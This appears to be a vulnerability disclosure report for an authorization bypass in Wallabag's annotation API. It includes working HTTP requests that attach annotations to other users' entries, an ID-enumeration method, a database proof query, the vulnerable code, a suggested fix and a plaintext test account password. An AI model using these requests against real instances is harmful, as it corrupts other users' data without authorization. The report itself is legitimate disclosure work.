# Wallabag Annotation Authorization Bypass

## Summary

Wallabag's annotation API allows a low-privilege authenticated user to create
annotation records attached to entries owned by other users. Direct access to
those entries is denied, but the annotation creation endpoint does not enforce
the same entry ownership check.

Suggested title:

```text
Authenticated users can create annotations on other users' entries
```

Classification:

- Authorization bypass / IDOR
- Cross-user server-side integrity corruption
- Not a confirmed confidentiality leak
- Not a confirmed victim-visible UI injection

## Impact

An attacker with a normal account can attach attacker-controlled annotation
records to another user's saved entries by guessing or enumerating entry IDs.
This corrupts cross-user server state and bypasses the ownership checks enforced
by other entry endpoints.

The impact is integrity-focused. In the tested Android client defaults, the
attacker-created annotation was not clearly visible in the victim UI because
annotation display is disabled by default and annotation reads are filtered by
annotation owner. Do not report this as stored XSS, UI injection, or
confidentiality impact without additional evidence.

## Reproduction

Attacker account used in testing:

```text
agentuser / AgentPass2024!
```

First, obtain an OAuth bearer token for the attacker account. Then compare entry
access with annotation creation.

Direct access to a victim-owned entry is denied:

```http
GET /api/entries/1.json
Authorization: Bearer <attacker_token>
```

Observed result:

```text
403 Forbidden
```

Creating an annotation on the same victim-owned entry succeeds:

```http
POST /api/annotations/1
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "text": "UNAUTHORIZED_ANNOTATION_MARKER",
  "quote": "",
  "ranges": []
}
```

Observed result:

```text
200 OK
```

The response contains a new annotation object owned by the attacker but attached
to the victim-owned entry.

Entry IDs can be enumerated by status code:

- `403`: existing entry owned by another user
- `200`: attacker-owned entry
- `404`: nonexistent entry

## Database Proof

With Docker access to the backend, inspect cross-owner annotation attachments:

```bash
docker exec wallabag php -r '$db=new PDO("sqlite:/var/www/wallabag/data/db/wallabag.sqlite"); foreach($db->query("SELECT a.id AS annotation_id, au.username AS annotation_owner, e.id AS entry_id, eu.username AS entry_owner, a.text FROM wallabag_annotation a JOIN wallabag_entry e ON e.id=a.entry_id JOIN wallabag_user au ON au.id=a.user_id JOIN wallabag_user eu ON eu.id=e.user_id WHERE au.username != eu.username") as $r){ echo json_encode($r), PHP_EOL; }'
```

Expected proof shape:

```json
{
  "annotation_id": 12,
  "annotation_owner": "agentuser",
  "entry_id": 1,
  "entry_owner": "victim_alice",
  "text": "UNAUTHORIZED_ANNOTATION_MARKER"
}
```

This shows the annotation row belongs to the attacker while the entry belongs to
the victim.

## Root Cause

Entry endpoints enforce owner checks. Annotation GET/POST endpoints only verify
that the requester is authenticated.

Correct ownership check pattern in entry API:

```php
// /var/www/wallabag/src/Wallabag/ApiBundle/Controller/EntryRestController.php
public function getEntryAction(Entry $entry)
{
    $this->validateAuthentication();
    $this->validateUserAccess($entry->getUser()->getId());

    return $this->sendResponse($entry);
}
```

Vulnerable annotation API:

```php
// /var/www/wallabag/src/Wallabag/ApiBundle/Controller/AnnotationRestController.php
public function getAnnotationsAction(Entry $entry)
{
    $this->validateAuthentication();

    return $this->forward('Wallabag\\AnnotationBundle\\Controller\\WallabagAnnotationController::getAnnotationsAction', [
        'entry' => $entry,
    ]);
}

public function postAnnotationAction(Request $request, Entry $entry)
{
    $this->validateAuthentication();

    return $this->forward('Wallabag\\AnnotationBundle\\Controller\\WallabagAnnotationController::postAnnotationAction', [
        'request' => $request,
        'entry' => $entry,
    ]);
}
```

The forwarded controller creates an annotation for the authenticated attacker and
attaches it to the provided `Entry` object:

```php
// /var/www/wallabag/src/Wallabag/AnnotationBundle/Controller/WallabagAnnotationController.php
$annotation = new Annotation($this->getUser());
$annotation->setEntry($entry);
```

Because the API controller never checks `$entry->getUser()->getId()`, a foreign
entry object can be used.

## Suggested Fix

Add entry ownership validation before forwarding annotation GET/POST actions:

```php
$this->validateUserAccess($entry->getUser()->getId());
```

Apply at least to:

- `AnnotationRestController::getAnnotationsAction(Entry $entry)`
- `AnnotationRestController::postAnnotationAction(Request $request, Entry $entry)`

PUT and DELETE already validate annotation ownership by looking up the annotation
with the current user ID. The missing check is on entry-scoped GET and POST.

## Report Wording

Suggested impact statement:

```text
A normal authenticated user can create annotation records attached to entries owned by other users by supplying foreign entry IDs to the annotation API. Other entry APIs correctly deny access to those entries, so this bypasses the intended ownership boundary and corrupts cross-user server-side state.
```

Suggested severity language:

```text
Integrity impact. Severity depends on whether downstream clients, exports, admin views, or future features expose or act on annotations attached across ownership boundaries.
```
